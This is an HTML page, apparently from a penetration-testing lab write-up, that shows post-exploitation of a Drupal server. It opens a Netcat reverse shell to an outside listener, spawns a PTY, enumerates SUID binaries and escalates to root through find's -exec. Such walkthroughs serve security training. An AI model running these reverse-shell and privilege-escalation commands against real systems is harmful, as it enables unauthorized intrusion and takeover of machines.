<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1 Reverse shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>5.1 Reverse shell</u></b></h1><br />I can run commands on the back-end server. So, let's get a “reverse shell” to my “Kali Linux” machine using “nc” utility.<br /><br />a) On your Kali Machine open a “Netcat listener”<br /><br /><div class="codebox"><div class="codebox">$&nbsp;nc&nbsp;-lnvp&nbsp;4444<br /></div></div><br /><br />b) On the Drupal Shell type:<br /><br />-n: numeric-only IP addresses, no DNS.<br />-v: verbose.<br /><br /><div class="codebox"><div class="codebox">&gt;&nbsp;nc&nbsp;-nv&nbsp;192.168.12.28&nbsp;4444&nbsp;-e&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span></div></div><br /><br />c) On your Kali Machine get a shell.<br /><br /><div class="codebox"><div class="codebox">$&nbsp;python3&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span><br />$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/162-1.png" alt="images/162-1.png" /><br /><br />d) On your Kali Machine check on the victim machine for any file having SUID permissions  with the help of “find” command. By using the following command, we  enumerated all binaries having SUID permissions:<br /><br /><div class="codebox"><div class="codebox">$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;-perm&nbsp;-u=s&nbsp;-type&nbsp;f&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br /></div></div><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/162-2.png" alt="images/162-2.png" /><br /><br />We can run “find” command.<br /><br />e) Get a shell with “root” user privileges.<br /><br /><br /><div class="codebox"><div class="codebox">$&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;-exec&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>&nbsp;<span style="color:#333333;font-weight:400">\;</span><br />$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br />$&nbsp;<span style="color:#ff9d00;font-weight:700">whoami</span></div></div><br /><br /><span style="color:#ffa500;">Output:</span><br /><img src="images/162-3.png" alt="images/162-3.png" /><br /><br />We're “root”!<br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>